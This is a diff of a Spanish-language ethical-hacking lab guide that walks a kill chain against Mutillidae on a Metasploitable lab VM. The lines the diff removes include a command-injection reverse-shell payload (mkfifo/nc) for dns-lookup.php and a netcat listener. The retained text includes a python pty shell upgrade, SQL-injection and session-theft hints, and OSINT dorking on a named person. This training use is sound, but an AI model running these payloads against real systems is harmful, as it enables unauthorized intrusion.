@@ -1,6 +1,6 @@
-# Reto 1 CEH Interno
+# Practica 2 
 
-> Antes de iniciar, recuerda hacer prueba de red, debes tener alcance a la Metasplotable y a internet.
+> Antes de iniciar, recuerda hacer prueba de red, debes tener alcance a la Metasplotable y a internet
 
 ## Objetivo
 ### - Principal
@@ -17,6 +17,7 @@ Controlar una forma de acceder a la informacion de Jakub
 - Reconocimiento de red y script de vulnerabilidades RustScan
 - Ingresa a Mutillidae en Metasploitable del Laboratorio http://metasploitable/mutillidae
 - Reconoce los directorios con DirSearch
+- En la entrega dns-lookups.php, acepta ejecucición de codigo remoto con &&
 
 ## 2. Militarizacion (Weaponization)
 ### - Estrategia
@@ -24,40 +25,37 @@ Controlar una forma de acceder a la informacion de Jakub
 - Exceso de seguridad (Totem):  Se confia en que el usuario realizara la busqueda correcta de DNS en dns-lookup.php
 	
 ### - Armamento 
-- Prepara el exploit de acuerdo a la respuesta que acepte el servidor
-- Netcat tiene una version obsoleta, algunos trucos pueden ayudarte
+- Robar la sesion con un exploit, de acuerdo a la respuesta que acepte el servidor
+> netcat, tiene una version obsoleta, algunos [trucos](https://github.com/heanczko311299/githack/blob/main/Trucos/ReverseShell/README.md) pueden ayudarte.
 
 ## 3. Entrega (Delivery)
 - login.php
-- dns.lookup.php
-- Prepara la recepcion en tu kali con
-	nc -lvnp 1234
+- dns-lookup.php
+- Prepara la recepcion del [ReverseShell](https://github.com/heanczko311299/githack/blob/main/Trucos/ReverseShell/README.md)
 		
-## Explotacion:
-- Ingresa en la entrega dns-lookup.php
-	&& rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc metasploitable 1234 >/tmp/f
-- Obten un shell interactivo utilizando python.
+## 4. Explotación (Exploitation)
+- Envia en entrega dns-lookup.php
+- Obten un shell interactivo utilizando python
 	$ python -c 'import pty; pty.spawn("/bin/bash")'
-- Busca algun dato sobre Jakub en la carpeta.
-- Consigue el apellido haciendo Dorking, tendras el objetivo.
+- Busca algun dato sobre Jakub en la carpeta
+- Consigue el apellido haciendo Dorking, tendras el objetivo
 	
-## Instalación:
+## 5. Instalación (Installation)
 - No se puede ejecutar nada desde www-data.
 - Busca un archivo que te permita robar alguna sesion del servidor.
-	** Quiza las siglas del equipo donde jugo su final de Champions ayude.
-- Obtener la clave cifrada y prueba en CyberChef de github
-	** Base64 / Hex / Base64
-- Ingresa a msfadmin con:
-	$ sudo 'usuario encontrado'
-- Y la contraseña para tener acceso, nos instalaremos aqui, no generamos backdoor.
+> Quiza las siglas del equipo donde jugo su final de Champions ayude.
+- Obtener la clave cifrada y prueba en [CyberChef](https://gchq.github.io/CyberChef/)
+> Base64 / Hex / Base64
+- Ingresa al usuario encontrado con:
+- Y la contraseña para tener acceso, nos instalaremos aqui, no generamos backdoor
 	
-## Comando & Control:
+## 6. Mando y Control (Command & Control)
 - Salir de la sesion.
 - Ingresa en la cuenta con las credenciales de SSH, y prueba el acceso a root.
 		
-## Acciones en el objetivo:
-- En lista las versiones vulnerables que validaste en la entrega, y prepara los exploits.
+## 7. Acciones en el objetivo (Actions on Objectives)
 - Si el login.php es vulnerable a SQL Injection, el login de user-info lo será? Qué obtenemos?
+- En lista las versiones vulnerables que validaste en la entrega, y prepara los exploits.
 
 ## Referencias
 
